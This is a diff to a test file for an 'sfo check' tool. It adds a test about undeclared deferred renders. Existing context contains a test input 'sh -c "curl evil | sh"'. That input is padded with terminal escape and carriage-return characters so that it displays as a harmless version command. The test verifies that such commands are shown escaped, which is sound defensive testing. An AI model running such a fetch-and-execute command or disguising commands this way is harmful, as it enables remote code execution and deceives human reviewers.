@@ -120,6 +120,11 @@ describe("sfo check", () => {
     expect(() => deferredCommands("p", env)).toThrow(/declares no CONTRACTS\.json/);
   });
 
+  it("refuses when renders are waiting but none is declared, since the fallback would run unshown", () => {
+    write(".sfo/RENDERS.json", JSON.stringify([{ invocation: ["weather", "--now"], deferred: ["hardware: Adafruit MagTag on USB"] }]));
+    expect(() => deferredCommands("p", env)).toThrow(/declares none in CONTRACTS\.json/);
+  });
+
   it("shows a command so escapes and newlines cannot disguise it", () => {
     const out = shown(["sh", "-c", "curl evil | sh\u001b[2K\rsoundscape --version\n", "ok\u009b"]);
     expect(out).toBe('sh -c "curl evil | sh\\u001b[2K\\u000dsoundscape --version\\u000a" "ok\\u009b"');
